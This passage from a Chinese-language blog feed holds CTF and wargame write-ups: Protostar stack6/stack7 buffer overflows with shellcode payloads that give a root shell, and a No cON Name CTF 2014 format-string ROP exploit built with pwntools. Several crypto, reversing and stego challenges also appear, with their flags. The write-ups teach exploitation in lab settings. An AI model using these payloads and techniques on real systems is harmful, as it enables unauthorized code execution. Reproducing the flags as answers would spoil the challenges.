&lt;getpath+64&gt;:        mov    $0x80485e4,%eax0x080484c9 &lt;getpath+69&gt;:        mov    -0xc(%ebp),%edx0x080484cc &lt;getpath+72&gt;:        mov    %edx,0x4(%esp)0x080484d0 &lt;getpath+76&gt;:        mov    %eax,(%esp)0x080484d3 &lt;getpath+79&gt;:        call   0x80483c0 &lt;printf@plt&gt;0x080484d8 &lt;getpath+84&gt;:        movl   $0x1,(%esp)0x080484df &lt;getpath+91&gt;:        call   0x80483a0 &lt;_exit@plt&gt;0x080484e4 &lt;getpath+96&gt;:        mov    $0x80485f0,%eax0x080484e9 &lt;getpath+101&gt;:       lea    -0x4c(%ebp),%edx0x080484ec &lt;getpath+104&gt;:       mov    %edx,0x4(%esp)0x080484f0 &lt;getpath+108&gt;:       mov    %eax,(%esp)0x080484f3 &lt;getpath+111&gt;:       call   0x80483c0 &lt;printf@plt&gt;0x080484f8 &lt;getpath+116&gt;:       leave0x080484f9 &lt;getpath+117&gt;:       retEnd of assembler dump.</code></pre><p>先记下ret的地址<code>0x080484f9</code>，然后运行一下代码：</p><pre><code>$python -c &apos;print &quot;A&quot;*80+&quot;B&quot;*4&apos; | ./stack6input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBAAAAAAAAAAAABBBBSegmentation fault (core dumped)</code></pre><p>用gdb调试：</p><pre><code># gdb -q -c /tmp/core.11.stack6.2180Core was generated by `./stack6&apos;.Program terminated with signal 11, Segmentation fault.#0  0x42424242 in ?? ()(gdb) x/40xw $esp-1000xbffffc9c:     0x00000001      0x00000000      0x00000001      0xb7fff8f80xbffffcac:     0x41414141      0x41414141      0x41414141      0x414141410xbffffcbc:     0x41414141      0x41414141      0x41414141      0x414141410xbffffccc:     0x41414141      0x41414141      0x41414141      0x414141410xbffffcdc:     0x41414141      0x41414141      0x41414141      0x414141410xbffffcec:     0x42424242      0x41414141      0x41414141      0x414141410xbffffcfc:     0x42424242      0x08048500      0x00000000      0xbffffd880xbffffd0c:     0xb7eadc76      0x00000001      0xbffffdb4      0xbffffdbc0xbffffd1c:     0xb7fe1848      0xbffffd70      0xffffffff      0xb7ffeff40xbffffd2c:     0x080482a1      0x00000001      0xbffffd70      0xb7ff0626</code></pre><p>将前面的ret地址放在<code>0xbffffcfc</code>处，后面放shellcode的地址，再后面就是shellcode：</p><pre><code>$python -c &apos;print &quot;A&quot;*80 + &quot;\xf9\x84\x04\x08&quot;+ &quot;\x04\xfd\xff\xbf&quot; + &quot;\x90&quot;*10 + &quot;\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&quot;&apos; | ./stack6input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA▒▒▒▒▒▒▒▒▒▒▒▒▒1▒1۰̀Sh/ttyh/dev▒▒1▒f▒&apos;▒̀1▒Ph//shh/bin▒▒PS▒ᙰ                                                          ̀# iduid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)</code></pre><p>##Stack 7<br>About<br>Stack6 introduces return to .text to gain code execution.</p><p>The metasploit tool “msfelfscan” can make searching for suitable instructions very easy, otherwise looking through objdump output will suffice.</p><p>This level is at /opt/protostar/bin/stack7</p><p>Source code</p><pre><code>#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;char *getpath(){ char buffer[64]; unsigned int ret; printf(&quot;input path please: &quot;); fflush(stdout); gets(buffer); ret = __builtin_return_address(0); if((ret &amp; 0xb0000000) == 0xb0000000) {  printf(&quot;bzzzt (%p)\n&quot;, ret);  _exit(1); } printf(&quot;got path %s\n&quot;, buffer); return strdup(buffer);}int main(int argc, char **argv){ getpath();}</code></pre><p>先反汇编，看一下getpath函数：</p><pre><code>(gdb) disas getpathDump of assembler code for function getpath:0x080484c4 &lt;getpath+0&gt;: push   %ebp0x080484c5 &lt;getpath+1&gt;: mov    %esp,%ebp0x080484c7 &lt;getpath+3&gt;: sub    $0x68,%esp0x080484ca &lt;getpath+6&gt;: mov    $0x8048620,%eax0x080484cf &lt;getpath+11&gt;:        mov    %eax,(%esp)0x080484d2 &lt;getpath+14&gt;:        call   0x80483e4 &lt;printf@plt&gt;0x080484d7 &lt;getpath+19&gt;:        mov    0x8049780,%eax0x080484dc &lt;getpath+24&gt;:        mov    %eax,(%esp)0x080484df &lt;getpath+27&gt;:        call   0x80483d4 &lt;fflush@plt&gt;0x080484e4 &lt;getpath+32&gt;:        lea    -0x4c(%ebp),%eax0x080484e7 &lt;getpath+35&gt;:        mov    %eax,(%esp)0x080484ea &lt;getpath+38&gt;:        call   0x80483a4 &lt;gets@plt&gt;0x080484ef &lt;getpath+43&gt;:        mov    0x4(%ebp),%eax0x080484f2 &lt;getpath+46&gt;:        mov    %eax,-0xc(%ebp)0x080484f5 &lt;getpath+49&gt;:        mov    -0xc(%ebp),%eax0x080484f8 &lt;getpath+52&gt;:        and    $0xb0000000,%eax0x080484fd &lt;getpath+57&gt;:        cmp    $0xb0000000,%eax0x08048502 &lt;getpath+62&gt;:        jne    0x8048524 &lt;getpath+96&gt;0x08048504 &lt;getpath+64&gt;:        mov    $0x8048634,%eax0x08048509 &lt;getpath+69&gt;:        mov    -0xc(%ebp),%edx0x0804850c &lt;getpath+72&gt;:        mov    %edx,0x4(%esp)0x08048510 &lt;getpath+76&gt;:        mov    %eax,(%esp)0x08048513 &lt;getpath+79&gt;:        call   0x80483e4 &lt;printf@plt&gt;0x08048518 &lt;getpath+84&gt;:        movl   $0x1,(%esp)0x0804851f &lt;getpath+91&gt;:        call   0x80483c4 &lt;_exit@plt&gt;0x08048524 &lt;getpath+96&gt;:        mov    $0x8048640,%eax0x08048529 &lt;getpath+101&gt;:       lea    -0x4c(%ebp),%edx0x0804852c &lt;getpath+104&gt;:       mov    %edx,0x4(%esp)0x08048530 &lt;getpath+108&gt;:       mov    %eax,(%esp)0x08048533 &lt;getpath+111&gt;:       call   0x80483e4 &lt;printf@plt&gt;0x08048538 &lt;getpath+116&gt;:       lea    -0x4c(%ebp),%eax0x0804853b &lt;getpath+119&gt;:       mov    %eax,(%esp)0x0804853e &lt;getpath+122&gt;:       call   0x80483f4 &lt;strdup@plt&gt;0x08048543 &lt;getpath+127&gt;:       leave0x08048544 &lt;getpath+128&gt;:       retEnd of assembler dump.</code></pre><p>在getpath+46行，将eax的值存到（ebp-0xc）处，而eax值为buffer的地址，所以在执行call eax后，会执行buffer中的之类，所以要在（ebp-0xc）前加jmp指令。</p><p>先来取call eax指令的地址，这里使用objdump命令，如下：</p><pre><code>$ objdump -D stack7 | grep &apos;call&apos;804835b:       e8 00 00 00 00          call   8048360 &lt;_init+0xc&gt;8048371:       e8 1e 00 00 00          call   8048394 &lt;__gmon_start__@plt&gt;8048376:       e8 25 01 00 00          call   80484a0 &lt;frame_dummy&gt;804837b:       e8 50 02 00 00          call   80485d0 &lt;__do_global_ctors_aux&gt;804842c:       e8 83 ff ff ff          call   80483b4 &lt;__libc_start_main@plt&gt;8048478:       ff 14 85 5c 96 04 08    call   *0x804965c(,%eax,4)80484bf:       ff d0                   call   *%eax80484d2:       e8 0d ff ff ff          call   80483e4 &lt;printf@plt&gt;80484df:       e8 f0 fe ff ff          call   80483d4 &lt;fflush@plt&gt;80484ea:       e8 b5 fe ff ff          call   80483a4 &lt;gets@plt&gt;8048513:       e8 cc fe ff ff          call   80483e4 &lt;printf@plt&gt;804851f:       e8 a0 fe ff ff          call   80483c4 &lt;_exit@plt&gt;8048533:       e8 ac fe ff ff          call   80483e4 &lt;printf@plt&gt;804853e:       e8 b1 fe ff ff          call   80483f4 &lt;strdup@plt&gt;804854b:       e8 74 ff ff ff          call   80484c4 &lt;getpath&gt;8048576:       e8 4f 00 00 00          call   80485ca &lt;__i686.get_pc_thunk.bx&gt;8048584:       e8 cb fd ff ff          call   8048354 &lt;_init&gt;80485b4:       ff 94 b3 18 ff ff ff    call   *-0xe8(%ebx,%esi,4)80485eb:       ff d0                   call   *%eax8048603:       e8 00 00 00 00          call   8048608 &lt;_fini+0xc&gt;804860f:       e8 2c fe ff ff          call   8048440 &lt;__do_global_dtors_aux&gt;2a0:   9a 06 00 00 80 00 90    lcall  $0x9000,$0x80000006</code></pre><p>使用的是0x080484bf，构造的exploit如下：</p><pre><code>$ python -c &apos;print &quot;\x90&quot;*62 + &quot;\xeb\x14&quot; + &quot;\x90&quot;*16 + &quot;\xbf\x84\x04\x08&quot; + &quot;\x90&quot;*10 + &quot;\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&quot;&apos; | ./stack7input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒1▒1۰̀Sh/ttyh/dev▒▒1▒f▒&apos;▒̀1▒Ph//shh/bin▒▒PS▒ᙰ                                                                  ̀# iduid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)</code></pre>]]></content>
      
      <categories>
          
          <category> Exploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Exercise </tag>
            
            <tag> Exploit </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>No cON Name CTF 2014 Quals Write-up</title>
      <link href="/2014/10/08/No-cON-Name-CTF-2014-Quals-Write-up/"/>
      <url>/2014/10/08/No-cON-Name-CTF-2014-Quals-Write-up/</url>
      <content type="html"><![CDATA[<p>#No cON Name CTF 2014 Quals Write-up</p><p>##cannaBINoids</p><a id="more"></a><p>直接用IDA反汇编，分析得知，需要输入128个字符：</p><pre><code>.text:08048525                 mov     eax, ds:stdin.text:0804852A                 push    eax.text:0804852B                 push    80h.text:08048530                 push    1.text:08048532                 lea     eax, [ebp-98h].text:08048538                 push    eax.text:08048539                 call    _fread.text:0804853E                 add     esp, 10h.text:08048541                 cmp     eax, 80h.text:08048546                 jz      short loc_8048552.text:08048548                 mov     eax, 1.text:0804854D                 jmp     loc_80485FE</code></pre><p> 然后调用mmap函数，从自己的内存空间读取128字节内容，如下：</p><pre><code>.text:08048580                 push    2.text:08048582                 push    1.text:08048584                 push    80h.text:08048589                 push    0.text:0804858B                 call    _mmap.text:08048590                 add     esp, 20h.text:08048593                 mov     [ebp-18h], eax.text:08048596                 cmp     dword ptr [ebp-18h], 0FFFFFFFFh.text:0804859A                 jnz     short loc_80485A3.text:0804859C                 mov     eax, 1.text:080485A1                 jmp     short loc_80485FE</code></pre><p>然后再对两者进行比较，直接验证一下：</p><pre><code># head -c 128 cannabinoid | ./cannabinoidYou got it!</code></pre><p>然后计算输入内容的sha1值：</p><pre><code>head -c 128 cannabinoid | sha1sumeffaf80a641b28a8d8a750b99ef740593bb3dcbd</code></pre><p>最终flag为：<code>NCN_effaf80a641b28a8d8a750b99ef740593bb3dcbd</code></p><p>##CRYPTonite</p><p>先搜索spanish的书，找到<a href="http://www.gutenberg.org/files/2000/old/2donq10.txt" target="_blank" rel="noopener">Don Quijote</a>，下载后，统计词频，然后替换，代码如下：</p><pre><code>import collectionsdef counter(filename):    f = open(filename, &quot;rb&quot;)    text = f.read()    count = collections.Counter(text)    f.close()    return countdef decode(alphabet, ciphertext, key):    dic = {}    for i in range(0, len(key)):        dic[key[i]] = alphabet[i]    plaintext = &quot;&quot;    for l in ciphertext:        if l in dic:            l = dic[l]        plaintext += l    return plaintextif __name__ == &quot;__main__&quot;:    # count1 = counter(&apos;spanish-book.enc&apos;)    # count2 = counter(&apos;DON_QUIJOTE.txt&apos;)    # print count1    # print count2    f = open(&apos;spanish-book.enc&apos;, &quot;rb&quot;)    ciphertext = f.read()    f.close()    print decode(&quot;EAOSNRLDIUTCM,QPBYHVGJF.Z;,!XS-W-K7&quot;, ciphertext, &quot;_C!BI)LRUPMQNA,.:GF;-V?SZDXKEHYO(JT&quot;)</code></pre><p>在替换后的内容中搜索<code>NCN</code>，搜索到<code>NCNKDEADBEAFCAFEBADBABEFEEDDEFACEDBEDFADEDEC</code>，将其中的<code>K</code>替换为<code>_</code>即可。</p><p>##eXPLicit<br>利用的string format漏洞，利用代码如下：</p><pre><code># -*- coding: utf-8 -*-import osimport sysimport timeimport refrom pwn import *from libformatstr import *REMOTE = 0if REMOTE:    host = &apos;88.87.208.163&apos;    port = 7070else:    host = &apos;127.0.0.1&apos;    port = 7070def connect():    return remote(host, port)def retrieve_val(res):    m = re.search(&apos;Your number is (.+) which is too low.&apos;, res)    if m:        leak = m.group(1)        return leak    else:        return Nonedef dump_stack():    for i in range(1, 100):        payload = (            &quot;%%%d$x&quot; % i +            &apos;\n&apos;        )        s.sendafter(&apos;Pick a number between 0 and 20: &apos;, payload)        res = s.recvuntil(&apos;which is too low.&apos;)        leak = retrieve_val(res)        if leak:            print &apos;%d: %s&apos; % (i, leak)        else:            print buf    s.interactive()def send_fmt(payload):    s.sendafter(&apos;Pick a number between 0 and 20: &apos;, payload + &apos;\n&apos;)bss = 0x80d6080 + 0x100int80 = 0x8082715  # int 0x80; retpopeax = 0x80a8ff6 # pop eax; retpopecx_ebx = 0x8060a7d # pop ecx; pop ebx; retpopedx_ecx_ebx = 0x8060a7c # pop edx; pop ecx; pop ebx; rets = connect()#dump_stack()send_fmt(&apos;%69$x&apos;)buf = s.recvuntil(&apos;which is too low.&apos;)retaddr = int(retrieve_val(buf), 16) - 76 # offsetlog.info(&apos;retaddr = %x&apos; % retaddr)# dup2(4, 0)p = FormatStr()p[retaddr] = [popeax, 0x3f, popecx_ebx, 0, 0x4, int80]send_fmt(p.payload(6))retaddr += 4*6# dup2(4, 1)p = FormatStr()p[retaddr] = [popeax, 0x3f, popecx_ebx, 1, 0x4, int80]send_fmt(p.payload(6))retaddr += 4*6# execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;, NULL], NULL)p = FormatStr()p[retaddr] = [popeax, 0x0b, popedx_ecx_ebx, 0, bss, bss+4*2, int80]send_fmt(p.payload(6))# [&quot;/bin/sh&quot;, NULL]p = FormatStr()p[bss] = [bss+4*2, 0, &apos;/bin/sh&apos;]send_fmt(p.payload(6))s.interactive()</code></pre><p>得到shell后：</p><pre><code>$ cat /home/ch5/flag.txtNcN_97740ead1060892a253be8ca33c6364a712b21d</code></pre><p>##imMISCible<br>查看文件类型：zip，解压得到：ctf.py，内容如下：</p><pre><code>#!/usr/bin/env python# -*- coding: rot13 -*-vzcbeg bfvzcbeg znefunyvzcbeg arjtybony syntqrs s():    tybony synt    synt = &quot;Abcr!&quot;.qrpbqr(&quot;rot13&quot;)olgrpbqr =&quot;&quot;&quot;LjNNNNNNNNNNNjNNNRNNNNOmyjNNNTDNNTDONTjNNT0ONSbONNSxNNOxNtOfNtOgNjOnNjNOMDZNMNZNMNDNtjVNMNHNnjVNpcZNMNLNLDDNqNDNMNpNA2RRNUDRNTDVNQquONO0ONOxPDN3LDDNqNDNntHNMNbNMNDNtjVNLDDNqNDNntLNMNfNtjRNLDDNMNjNMDRNqNDNtjRNntpNtjNNS2RRNT4NNTDANSZbQtNNNTa/////XNRNNNOmONNNNUAbLGRbNDNNNUZTNNNNM2I0MJ52pjfNNNOBG19QG05sGxSAEKZNNNNNpjRNNNOMpmRNNNNtAGptAwttAwRtAmDtZwNtAwxtAmZtZwNtAmDtAwttAwHtZwNtAwRtAwxtAmVtZzDtpmRNNNNtAmZtAmNtAwHtAwHtAwDtZwNtAmLtAwHtAzZtAzLtAwZtAwxtAmDtAmxtZwNtAzLtpmRNNNNtAwLtZwNtAwRtAzHtZwNtAmHtAzHtAzZtAwRtAwDtAwHtAzHtZwNtAmZtAmptAwRtpkNNNNNtAzZtAzZtAzLtAmptZ2LtpjRNNNNtpjZNNNObMKumNjNNNR5QGx4bPNNNNUZUNNNNnTSmnTkcLaZRNNNNp2uuZKZPNNNNo3AmOtNNNTqyqTIhqaZRNNNNMzkuM3ZUNNNNpzIjoTSwMKZTNNNNMTIwo2EypjxNNNObMKuxnJqyp3DbNNNNNPtNNNNNXNNNNNOmPNNNNQkmqUWcozp+pjtNNNN8oJ9xqJkyCtVNNNOmRtNNNONORNRINtLOPtRXNDbORtRCND==&quot;&quot;&quot;vs __anzr__ != &quot;__znva__&quot;.qrpbqr(&quot;rot13&quot;):    pbqrbow = znefuny.ybnqf(olgrpbqr.qrpbqr(&quot;rot13&quot;))    s = arj.shapgvba(pbqrbow, tybonyf(), &quot;s&quot;.qrpbqr(&quot;rot13&quot;), Abar, Abar)s()cevag synt</code></pre><p>根据注释提示，代码经过ROT13加密，解密后的代码如下：</p><pre><code>import osimport marshalimport newglobal flagdef f():    global flag    flag = &quot;Abcr!&quot;.decode(&quot;rot13&quot;)bytecode = &quot;&quot;&quot;LjNNNNNNNNNNNjNNNRNNNNOmyjNNNTDNNTDONTjNNT0ONSbONNSxNNOxNtOfNtOgNjOnNjNOMDZNMNZNMNDNtjVNMNHNnjVNpcZNMNLNLDDNqNDNMNpNA2RRNUDRNTDVNQquONO0ONOxPDN3LDDNqNDNntHNMNbNMNDNtjVNLDDNqNDNntLNMNfNtjRNLDDNMNjNMDRNqNDNtjRNntpNtjNNS2RRNT4NNTDANSZbQtNNNTa/////XNRNNNOmONNNNUAbLGRbNDNNNUZTNNNNM2I0MJ52pjfNNNOBG19QG05sGxSAEKZNNNNNpjRNNNOMpmRNNNNtAGptAwttAwRtAmDtZwNtAwxtAmZtZwNtAmDtAwttAwHtZwNtAwRtAwxtAmVtZzDtpmRNNNNtAmZtAmNtAwHtAwHtAwDtZwNtAmLtAwHtAzZtAzLtAwZtAwxtAmDtAmxtZwNtAzLtpmRNNNNtAwLtZwNtAwRtAzHtZwNtAmHtAzHtAzZtAwRtAwDtAwHtAzHtZwNtAmZtAmptAwRtpkNNNNNtAzZtAzZtAzLtAmptZ2LtpjRNNNNtpjZNNNObMKumNjNNNR5QGx4bPNNNNUZUNNNNnTSmnTkcLaZRNNNNp2uuZKZPNNNNo3AmOtNNNTqyqTIhqaZRNNNNMzkuM3ZUNNNNpzIjoTSwMKZTNNNNMTIwo2EypjxNNNObMKuxnJqyp3DbNNNNNPtNNNNNXNNNNNOmPNNNNQkmqUWcozp+pjtNNNN8oJ9xqJkyCtVNNNOmRtNNNONORNRINtLOPtRXNDbORtRCND==&quot;&quot;&quot;if __name__ != &quot;__znva__&quot;.decode(&quot;rot13&quot;):    codeobj = marshal.loads(bytecode.decode(&quot;rot13&quot;).decode(&quot;base64&quot;))    f = new.function(codeobj, globals(), &quot;f&quot;, None, None)f()print flag</code></pre><p>可以看到，if里面不会执行，将<code>!=</code>改为<code>==</code>，但是直接执行会提示错误，只能使用<code>dis.dis()</code>函数反编译<code>f()</code>函数，得到内容如下：</p><pre><code> 2           0 LOAD_CONST               0 (-1)             3 LOAD_CONST               1 ((&apos;sha1&apos;,))             6 IMPORT_NAME              0 (hashlib)             9 IMPORT_FROM              1 (sha1)            12 STORE_NAME               1 (sha1)            15 POP_TOP              3          16 LOAD_CONST               0 (-1)            19 LOAD_CONST               2 ((&apos;getenv&apos;,))            22 IMPORT_NAME              2 (os)            25 IMPORT_FROM              3 (getenv)            28 STORE_NAME               3 (getenv)            31 POP_TOP              4          32 LOAD_NAME                3 (getenv)            35 LOAD_CONST               3 (&apos;NO_CON_NAME&apos;)            38 LOAD_CONST               4 (&apos;&apos;)            41 CALL_FUNCTION            2            44 LOAD_CONST               5 (&apos;Y&apos;)            47 COMPARE_OP               2 (==)            50 POP_JUMP_IF_FALSE      147 6          53 LOAD_CONST               6 (&apos; 57 68 61 74 20 69 73 20 74 68 65 20 61 69 72 2d &apos;)            56 STORE_GLOBAL             4 (flag) 7          59 LOAD_GLOBAL              4 (flag)            62 LOAD_CONST               7 (&apos; 73 70 65 65 64 20 76 65 6c 6f 63 69 74 79 20 6f &apos;)            65 INPLACE_ADD                     66 STORE_GLOBAL             4 (flag) 8          69 LOAD_GLOBAL              4 (flag)            72 LOAD_CONST               8 (&apos; 66 20 61 6e 20 75 6e 6c 61 64 65 6e 20 73 77 61 &apos;)            75 INPLACE_ADD                     76 STORE_GLOBAL             4 (flag) 9          79 LOAD_GLOBAL              4 (flag)            82 LOAD_CONST               9 (&apos; 6c 6c 6f 77 3f &apos;)            85 INPLACE_ADD                     86 STORE_GLOBAL             4 (flag)10          89 LOAD_GLOBAL              4 (flag)            92 LOAD_ATTR                5 (replace)            95 LOAD_CONST              10 (&apos; &apos;)            98 LOAD_CONST               4 (&apos;&apos;)           101 CALL_FUNCTION            2           104 STORE_GLOBAL             4 (flag)11         107 LOAD_GLOBAL              4 (flag)           110 LOAD_ATTR                6 (decode)           113 LOAD_CONST              11 (&apos;hex&apos;)           116 CALL_FUNCTION            1           119 STORE_GLOBAL             4 (flag)12         122 LOAD_CONST              12 (&apos;NCN&apos;)           125 LOAD_NAME                1 (sha1)           128 LOAD_GLOBAL              4 (flag)           131 CALL_FUNCTION            1           134 LOAD_ATTR                7 (hexdigest)           137 CALL_FUNCTION            0           140 BINARY_ADD                     141 STORE_GLOBAL             4 (flag)           144 JUMP_FORWARD             0 (to 147)       &gt;&gt;  147 LOAD_CONST              13 (None)           150 RETURN_VALUE</code></pre><p>分析知道，有两种方法来解决，一种是设置环境变量<code>NO_CON_NAME</code>的值为<code>Y</code>，另一种解码十六进制值，计算解码后的字符串的sha1值，得到flag：<code>NCN6ceeeff26e72a40b71e6029a7149ad0626fcf310</code></p><p>##inBINcibles<br>用IDA分析，使用的是golang语言写的，可以看到参数个数为2，第二个参数的长度为16：</p><pre><code>if ( *(_DWORD *)&amp;os_Args[4] == 2 ){    if ( *(_DWORD *)&amp;os_Args[4] &lt;= 1u )    {      runtime_panicindex(v5);      BUG();    }    if ( *(_DWORD *)(*(_DWORD *)os_Args + 12) == *(_DWORD *)(v52 + 4) )    ...</code></pre><p>然后在main.func.001函数中生成16个字符，与输入的比较，生成16个字符过程如下：</p><pre><code>.text:08049418                 mov     eax, [esp+24h+var_10].text:0804941C                 mov     ebx, ebp.text:0804941E                 mov     ebp, [esp+24h+var_C].text:08049422                 sub     ebp, ebx.text:08049424                 cmp     ebp, [ecx+4].text:08049427                 jnb     loc_80494B2.text:0804942D                 mov     esi, [ecx].text:0804942F                 lea     esi, [esi+ebp].text:08049432                 movzx   ebp, byte ptr [esi].text:08049435                 mov     ecx, ebp.text:08049437                 cmp     dword ptr ds:os_Args+4, 1.text:0804943E                 jbe     short loc_80494AB.text:08049440                 mov     ebx, dword ptr ds:os_Args.text:08049446                 add     ebx, 8.text:08049449                 cmp     edi, [ebx+4].text:0804944C                 jnb     short loc_80494A4.text:0804944E                 mov     esi, [ebx].text:08049450                 lea     esi, [esi+edi].text:08049453                 movzx   ebp, byte ptr [esi].text:08049456                 xor     ecx, ebp.text:08049458                 mov     ebx, [esp+24h+var_4].text:0804945C                 cmp     edi, [ebx+4].text:0804945F                 jnb     short loc_804949D.text:08049461                 mov     esi, [ebx].text:08049463                 lea     esi, [esi+edi].text:08049466                 movzx   ebp, byte ptr [esi].text:08049469                 xchg    eax, ebp.text:0804946A                 cmp     cl, al.text:0804946C                 xchg    eax, ebp.text:0804946D                 jz      short loc_8049496.text:0804946F                 mov     [esp+24h+var_15], 0</code></pre><p>主要是在0x08049456和0x08049469处，分别看exc和ebp的值，得到的两个序列如下：</p><pre><code>ecx = 0x12,0x45,0x33,0x87,0x65,0x12,0x45,0x33,0x87,0x65,0x12,0x45,0x33,0x87,0x65,0x12ebp = 0x55,0x75,0x44,0xb6,0x0b,0x33,0x06,0x03,0xe9,0x02,0x60,0x71,0x47,0xb2,0x44,0x33</code></pre><p>然后将它们进行xor运算，得到：<code>G0w1n!C0ngr4t5!!</code>，验证一下：</p><pre><code>./inbincible &apos;G0w1n!C0ngr4t5!!&apos;Yeah!</code></pre><p>所以，最终flag为：<code>NcN_ce71ba32ccf191cc3b62ae73c7ffd1acf5e2f296</code></p><p>##MISCall<br>查看文件类型，为bz2文件，解压后得到flag.txt，但里面的内容没用，还有一个.git目录，从里面可以看到是initial commit。然后，执行<code>git stash pop</code>命令，得到新的flag.txt和s.py文件，s.py文件内容如下：</p><pre><code>#!/usr/bin/env pythonfrom hashlib import sha1with open(&quot;flag.txt&quot;, &quot;rb&quot;) as fd:    print &quot;NCN&quot; + sha1(fd.read()).hexdigest()</code></pre><p>直接运行s.py，得到flag：<code>NCN4dd992213ae6b76f27d7340f0dde1222888df4d3</code></p><p>##STEGOsaurus<br>用Audacity打开，如下：<br><img src="https://lh6.googleusercontent.com/-1UpWy0cFzyg/VBuTbM5eLrI/AAAAAAAAAsk/RV6Rsd4ctHI/s0/%25E9%25A2%2591%25E8%25B0%25B1%25E5%259B%25BE0.PNG" alt="频谱图" title="频谱图0.PNG"><br>可以看出前一分钟内的内容有问题，转换为频谱图，很明显是莫斯码：<br><img src="https://lh3.googleusercontent.com/-8ejiZ2fLxrM/VBuS0LBDxlI/AAAAAAAAAsU/cZhRoapM-RM/s0/%25E9%25A2%2591%25E8%25B0%25B1%25E5%259B%25BE.PNG" alt="频谱图（0~100Hz）" title="频谱图.PNG"></p><p>从图中得到的莫斯码：</p><pre><code>-. -.-. -. ...-- -.-. -... ..-. -.. -.-. -.-. ---.. -.. --... .- ..--- ..... --... -.. ---.. ----- -.... ..--- ..... -.... ----- . ---.. ---.. -.. -.. --... -.. --... ..-. -.. -.... ..... -.. -.-. -.... ....- --... .-</code></pre><p>得到flag：<code>NCN3CBFDCC8D7A257D8062560E88DD7D7FD65DC647A</code></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
